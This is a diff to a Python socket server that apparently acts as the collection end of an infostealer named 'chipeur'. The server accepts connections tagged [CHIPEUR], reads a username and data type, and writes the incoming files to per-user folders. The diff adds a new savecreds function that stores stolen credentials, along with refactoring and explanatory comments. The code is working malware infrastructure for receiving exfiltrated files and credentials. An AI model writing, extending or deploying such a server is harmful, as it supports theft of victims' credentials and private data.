@@ -3,7 +3,8 @@ import os
 import time
 import threading
 
-def savefile(username: str, datatype: str, filename: str, client: socket.socket):
+def createpath(username: str, datatype: str):
+    """ create the folder to store the data ./username/datatype """
     try :
         os.mkdir(username)
     except FileExistsError:
@@ -17,13 +18,20 @@ def savefile(username: str, datatype: str, filename: str, client: socket.socket)
         os.mkdir(path)
     except FileExistsError:
         print(f"DEBUG: {path} directory already exists.")
-    except:
-        print(f"DEBUG: Error while creating the {path} directory. Abort")
-        return
 
-    path: str = username + "/" + datatype + "/" + str(int(time.time())) + "_" + filename
+    path: str = username + "/" + datatype + "/"
+    return path
+
+def savefile(username: str, datatype: str, filename: str, client: socket.socket):
+    """ create and write a file in the directory ./username/file/"""
+
+    path = createpath(username, datatype)
+
+    # creating a unique file to avoid overwriting
+    path = path + str(int(time.time())) + "_" + filename
     fic = open(path, "w")
     ch = client.recv(9).decode("utf-8")
+    # ending condition, chipeur client allways send it
     while ch[-9:] != "[RUEPIHC]":
         try:
             cur_c = client.recv(1).decode("utf-8")
@@ -31,12 +39,35 @@ def savefile(username: str, datatype: str, filename: str, client: socket.socket)
         except:
             fic.write(ch)
             fic.close()
+            return
     ch = ch[:-9]
     print(f"DEBUG: Writing '{path}' file")
     fic.write(ch)
     fic.close()
 
+def savecreds(username: str, datatype: str, client: socket.socket):
+    """ create and write a file in the directory ./username/file/ """
+    path = createpath(username, datatype)
+    path = path + "creds_" + str(int(time.time()))
+    fic = open(path, "w")
+    ch = client.recv(9).decode("utf-8")
+    # ending condition, chipeur client allways send it
+    while ch[-9:] != "[RUEPIHC]":
+        try:
+            cur_c = client.recv(1).decode("utf-8")
+            ch += cur_c
+        except:
+            fic.write(ch)
+            fic.close()
+            return
+    ch = ch[:-9]
+    print(f"DEBUG: Writing '{path}' file")
+    fic.write(ch)
+    fic.close()
+    
+
 def read_until_next_pipe_UTF16(client: socket.socket):
+    """ this function is used to parse the chipeur request and gather the information of the request """
     ch = ""
     cur_c = ""
     attempt = 0
@@ -53,26 +84,32 @@ def read_until_next_pipe_UTF16(client: socket.socket):
             if attempt == 3:
                 print("DEBUG: read_until_next_pipe_UTF16: 3rd time reading fails: exiting")
                 raise TimeoutError
+    # we return the data before the pipe
     return ch[:-1]
 
 def handle_client(client_socket, addr):
     print(f"Connection from {addr}")
     try:
         while True:
+            # should read [CHIPEUR]
             chipeur = read_until_next_pipe_UTF16(client_socket)
-            print(chipeur)
             if "[CHIPEUR]" not in chipeur:
-                print("pas chipeur")
                 client_socket.close()
                 break
-
+            
             username = read_until_next_pipe_UTF16(client_socket)
 
             datatype = read_until_next_pipe_UTF16(client_socket)
 
+            # only two datatypes possible
             if datatype == "file":
                 filename = read_until_next_pipe_UTF16(client_socket)
                 savefile(username, datatype, filename, client_socket)
+
+            if datatype == "credentials":
+                savecreds(username, datatype, client_socket)
+
+
     except ConnectionResetError as error:
         print(f"DEBUG: Connection closed: {error}")
     except TimeoutError as error:
